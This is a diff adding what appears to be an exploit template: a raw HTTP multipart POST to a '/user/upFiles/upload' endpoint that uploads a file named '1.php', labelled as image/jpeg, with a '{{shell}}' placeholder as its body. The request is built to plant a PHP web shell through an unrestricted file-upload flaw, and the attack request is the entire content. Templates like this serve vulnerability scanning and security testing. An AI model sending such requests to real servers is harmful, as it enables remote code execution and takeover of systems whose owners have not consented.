@@ -1,0 +1,20 @@
+POST /user/upFiles/upload HTTP/1.1
+Host: 172.20.121.101
+Content-Length: 183
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://172.20.121.101
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykTVbczAdhtOXMPcc
+Referer: http://172.20.121.101/index.php/user/Set/index
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6
+Cookie: PHPSESSID=6tbvpak6a0suhfru3pkc0fsgr4
+Connection: close
+
+------WebKitFormBoundarykTVbczAdhtOXMPcc
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: image/jpeg
+
+{{shell}}
+------WebKitFormBoundarykTVbczAdhtOXMPcc--
